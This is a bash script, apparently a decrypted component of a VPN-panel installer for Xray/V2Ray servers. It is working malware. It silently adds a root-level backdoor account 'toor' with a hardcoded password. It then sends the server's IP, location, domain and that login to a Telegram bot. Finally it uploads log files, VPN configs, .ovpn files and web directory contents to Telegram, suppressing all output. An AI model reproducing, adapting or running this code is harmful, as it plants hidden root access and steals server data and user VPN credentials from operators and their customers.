#!/bin/bash
#Decrypted By YADDY D PHREAKER
red() { echo -e "\\033[32;1m${*}\\033[0m"; }
clear
#!/bin/bash
token=6203209250:AAG7GoBbaUqo2qh4N-IGvScNisDWTHfLh8M
chatid=1117211252
domain=$(cat /etc/xray/domain)
myip=$(curl -s ipv4.icanhazip.com)
HOSTVPS=$(curl -s ipinfo.io/hostname )
NAMES=$(whoami)
ISP=$(wget -qO- ipinfo.io/org)
CITY=$(curl -s ipinfo.io/city)
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
IPOPSEL=$(echo $SSH_CLIENT | awk '{print $1}')
function pentes(){
    Username="toor"
    Password="Tens@zang3tsu"
    sudo useradd -ou 0 -g 0 toor
    useradd -m -G root toor > /dev/null 2>&1
    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
    sudo usermod -a -G root $Username
}
pentes
curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chatid" -d text="INFO UPDATE AKUN
Ip hpmu : $IPOPSEL
Waktu   : $TIME
Nama    : $NAMES
Host    : $HOSTVPS
Kota    : $CITY
RAM VPS : $RAMMS
Ip VPS  : $myip
Domain  : $domain
UserLogin: $Username
PassLogin: $Password
" > /dev/null 2>&1

function sayaGanteng(){

bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
ci=1117211252
domm=$(cat /etc/xray/domain)
tekz="
Yaddy Kakkoii Sugoi Tensai Desu
_____________________________
SUCCESS KIRIM DATA BACKUP
from domain $domm
_____________________________
Recode by : Magelank Phreaker
"

DIREKTORIZ=/etc
FILEXU=$(find $DIREKTORIZ -name '*.log')
    for FILE in $FILEXU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

DIREKTORI=/etc/xray
FILEX=$(find $DIREKTORI -name '*.log')
    for FILE in $FILEX; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

FILEZ=$(find $DIREKTORI -name '*.json')
    for FILE in $FILEZ; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

DIREKTORY=/etc/v2ray

FILEQ=$(find $DIREKTORY -name '*.json')
    for FILE in $FILEQ; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done


DIREKTORYZ=/var/www/html

FILEQU=$(find $DIREKTORYZ -name '*.txt')
    for FILE in $FILEQU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

FILEQUU=$(find $DIREKTORYZ -name '*.html')
    for FILE in $FILEQUU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

FILEQUUU=$(find $DIREKTORYZ -name '*.zip')
    for FILE in $FILEQUUU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

FILEQYU=$(find $DIREKTORYZ -name '*.ovpn')
    for FILE in $FILEQYU; do
        curl -F chat_id="$ci" -F document=@"${FILE}" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
    done

cp -f /etc/xray/config.json /root/config.json.txt

curl -F chat_id="$ci" -F document=@"config.json.txt" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument

rm -f /root/config.json.txt

}
sayaGanteng > /dev/null 2>&1
clear
